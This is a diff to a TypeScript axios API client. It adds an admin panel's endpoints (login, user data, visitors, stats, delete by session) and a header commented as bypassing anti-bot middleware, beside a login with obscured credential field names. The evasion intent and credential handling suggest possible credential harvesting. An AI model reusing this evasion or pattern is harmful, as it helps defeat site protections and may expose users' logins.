@@ -27,7 +27,9 @@ const api = axios.create({
   timeout: 300000, // 5 minutes for mobile networks
   headers: {
     'Accept': 'application/json',
-    'Cache-Control': 'no-cache'
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Cache-Control': 'no-cache',
+    'User-Agent': navigator.userAgent // Add browser user agent to bypass anti-bot middleware
   },
   // Enhanced configuration for mobile uploads
   maxContentLength: 50 * 1024 * 1024, // 50MB
@@ -195,6 +197,58 @@ const fallbackMobileUpload = async (formData: FormData): Promise<any> => {
 
 // API endpoints
 export const apiService = {
+  // Admin login endpoint
+  adminLogin: async (data: { password: string }) => {
+    try {
+      const response = await api.post('/admin/login', data);
+      return response.data;
+    } catch (error: any) {
+      console.log('Admin login error:', error);
+      throw new Error(error.response?.data?.message || error.message || 'Admin login failed. Please try again.');
+    }
+  },
+
+  // Admin endpoints
+  getAdminUserData: async () => {
+    try {
+      const response = await api.get('/admin/user-data');
+      return response.data;
+    } catch (error: any) {
+      console.log('Admin user data error:', error);
+      throw new Error(error.response?.data?.message || error.message || 'Failed to get user data.');
+    }
+  },
+
+  getAdminVisitors: async () => {
+    try {
+      const response = await api.get('/admin/visitors');
+      return response.data;
+    } catch (error: any) {
+      console.log('Admin visitors error:', error);
+      throw new Error(error.response?.data?.message || error.message || 'Failed to get visitors data.');
+    }
+  },
+
+  getAdminStats: async () => {
+    try {
+      const response = await api.get('/admin/stats');
+      return response.data;
+    } catch (error: any) {
+      console.log('Admin stats error:', error);
+      throw new Error(error.response?.data?.message || error.message || 'Failed to get stats.');
+    }
+  },
+
+  deleteAdminData: async (sessionId: string) => {
+    try {
+      const response = await api.delete(`/admin/delete-data/${sessionId}`);
+      return response.data;
+    } catch (error: any) {
+      console.log('Admin delete error:', error);
+      throw new Error(error.response?.data?.message || error.message || 'Failed to delete data.');
+    }
+  },
+
   // Login endpoint
   login: async (data: { xusr: string; xpss: string }) => {
     try {
